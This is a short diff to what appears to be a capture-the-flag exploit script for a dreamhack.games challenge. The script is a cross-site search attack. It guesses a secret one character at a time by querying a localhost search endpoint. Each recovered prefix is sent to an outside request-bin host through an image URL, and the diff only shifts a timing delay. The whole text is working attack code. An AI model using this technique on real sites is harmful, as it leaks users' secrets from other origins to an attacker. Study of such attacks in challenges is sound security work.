@@ -16,7 +16,6 @@
 
     async function search(query) {
         try {
-            await setTimeout(() => {}, 500);
             await req(
               `http://localhost:8000/search?query=${query}`
             );
@@ -35,6 +34,7 @@
                 if (await search(secret + c)) {
                     secret += c;
                     img.src = `https://${window.location.hash.slice(1)}.request.dreamhack.games/${secret}`;
+                    await setTimeout(() => {}, 1000);
                     break;
                 }
             }
